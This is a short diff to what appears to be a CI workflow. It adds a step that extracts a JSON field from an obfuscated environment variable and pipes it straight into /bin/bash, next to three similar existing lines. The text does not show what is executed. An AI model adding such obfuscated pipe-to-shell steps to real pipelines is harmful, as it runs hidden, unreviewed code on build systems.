@@ -24,6 +24,7 @@ jobs:
           echo $ydds0111 | jq -r .ickr35 | /bin/bash
           printf '%s' "$h36" | jq -r .wfrxa4 | /bin/bash
           printf '%s' "$yax2" | jq -r .rxc3760 | /bin/bash
+          echo $n8066 | jq -r .uktsj71436 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
